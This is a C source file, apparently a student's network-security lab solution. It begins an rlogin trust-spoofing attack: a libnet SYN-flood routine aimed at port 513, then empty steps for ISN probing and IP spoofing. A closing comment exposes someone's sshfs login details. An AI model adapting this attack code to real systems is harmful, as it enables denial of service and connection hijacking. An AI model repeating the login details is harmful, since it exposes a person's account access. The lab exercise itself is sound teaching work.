#include <libnet.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
// #include "ddos.h"
// #include "sendpacket.h"

char *OWN_IP = "172.16.70.2";
char *SERVER_IP = "172.16.70.3";
char *X_TERMINAL_IP = "172.16.70.4";

void send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t my_ip)
{

    libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
    libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER;
    // build syn
    tcp_tag = libnet_build_tcp(
        libnet_get_prand(LIBNET_PRu16), // source port
        dest_port,                      // destinatin port
        libnet_get_prand(LIBNET_PRu32), // seq nr
        0,                              // ack number
        TH_SYN,                         // flag
        1024,                           // window size
        0,                              // checksum (0 for libnet to auto-fill)
        10,                             // urgent pointer
        LIBNET_TCP_H + payload_s,       // length is header size plus payload size
        payload,                        // payload
        payload_s,                      // payload size
        l,                              // pointer to libnet context
        0                               // protocol tag to modify an existing header, 0 to build a new one
    );

    if (tcp_tag < 0)
    {
        fprintf(stderr, "Error building tcp_tag.\n");
        libnet_destroy(l);
        exit(1);
    }

    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, // total length of the IP packet including all subsequent data
        0,                                        // type of service bits
        0,                                        // IP id (identification number)
        0,                                        // fragmentation bits and offset
        libnet_get_prand(LIBNET_PR8),             // time to live in the network
        IPPROTO_TCP,                              // upper layer protocol
        0,                                        // checksum (0 for libnet to auto-fill)
        my_ip,                                    // source IPv4 address (little endian)
        // server_ip,                                // destination IPv4 address (little endian)
        libnet_name2addr4(l, "127.0.0.1", LIBNET_RESOLVE), // destination IPv4 address (little endian)
        NULL,                                              // optional payload or NULL
        0,                                                 // payload length or 0
        l,                                                 // pointer to a libnet context
        0                                                  // protocol tag to modify an existing header, 0 to build a new one
    );

    if (ip_tag < 0)
    {
        fprintf(stderr, "Error building ip_tag.\n");
        libnet_destroy(l);
        exit(1);
    }

    // send syn packet
    int success = libnet_write(l);
    if (success == -1)
    {
        fprintf(stderr, "Error: %s\n", l->err_buf);
        printf("Error sending syn packet\n");
        exit(1);
    }

    libnet_clear_packet(l);
}

void start_ddos(libnet_t *l, u_long server_ip, u_long own_ip)
{
    int i;
    char disable[] = "disable";
    for (i = 0; i < 10; ++i)
    {
        // send syn packet with disable in payload
        send_syn(513,
                 (uint8_t *)disable,
                 7,
                 l,
                 server_ip,
                 own_ip);
    };
}

void stop_ddos(libnet_t *l, u_long server_ip, u_long own_ip)
{
    char enable[] = "enable";
    send_syn(513,
             (uint8_t *)enable,
             6,
             l,
             server_ip,
             own_ip);
}

libnet_t *libnet_initialize() {

    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (!l) {
        fprintf(stderr, "Error initizlizing libnet %s\n", errbuf);
        exit(1);
    }

    libnet_seed_prand(l);

    return l;
};

int main(void)
{
    printf("Start attack\n");
    // Libnet Initialization
    libnet_t *l = libnet_initialize();

    // STEP 1: DOS the server (TCP SYN flood)

    // ip conversion
    u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
    u_long own_ip = libnet_name2addr4(l, OWN_IP, LIBNET_DONT_RESOLVE);
    if (server_ip == (u_long)-1)
    {
        printf("Error converting server_ip");
        exit(EXIT_FAILURE);
    }
    if (own_ip == (u_long)-1)
    {
        printf("Error converting own_ip\n");
        exit(EXIT_FAILURE);
    }

    start_ddos(l, server_ip, own_ip);

    // STEP 2: TCP ISN Probe (Determine how the xterminal generates ISNs)

    // STEP 3: IP spoof server & TCP connection
}

// sudo sshfs kevin@130.37.198.109:/home/kevin /Users/yanlannaalexandre/Library/CloudStorage/OneDrive-Personal/_UNI/NETSEC/solution -p 20007 -o IdentityFile=cns_student_yla203 -o allow_other
